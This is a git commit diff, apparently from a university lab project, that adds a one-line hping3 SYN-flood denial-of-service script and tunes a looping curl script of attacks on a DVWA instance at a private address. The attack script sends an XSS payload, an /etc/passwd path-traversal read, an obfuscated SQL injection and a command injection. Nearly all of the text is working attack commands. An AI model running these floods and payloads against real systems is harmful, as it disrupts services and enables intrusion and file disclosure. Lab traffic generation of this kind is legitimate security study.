4c82d6df78bcf97a6ce909158b145f64463eebf7
chris liu <chris.liu@dal.ca>
2020-07-21 17:22:29 +0300

    add dos shell script

---
+++ project/project-source-code/denialOfService.sh
@@ -0,0 +1,1 @@
+sudo hping3 --rand-source 172.16.1.20 -S -q -p 80 --flood
--- project/project-source-code/webAttack.sh
+++ project/project-source-code/webAttack.sh
@@ -2,11 +2,11 @@
 while true
 do
     curl http://172.16.1.20/dvwa/vulnerabilities/sqli/?id=1+%3Cscript%3Ealert%28%22am+also+vlunerable%22%29%3C%2Fscript%3E&Submit=Submit#
-    sleep 5
+    sleep 40 
     curl http://172.16.1.20/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
-    sleep 5
+    sleep 40
     curl http://172.16.1.20/dvwa/vulnerabilities/sqli/?id=%2F*********%2F%27%2F*************%2For%2F************%2F1%3D1%2F***************%2F%3B%23&Submit=Submit#
-    sleep 5
+    sleep 40
     sudo curl -d "ip=127.0.0.1+%7C%7C+ls+-l+%2Fvar%2Fwww%2Fdvwa%2F" -d "submit=submit" -X POST  http://172.16.1.20/dvwa/vulnerabilities/exec/#
-    sleep 5
+    sleep 40
 done
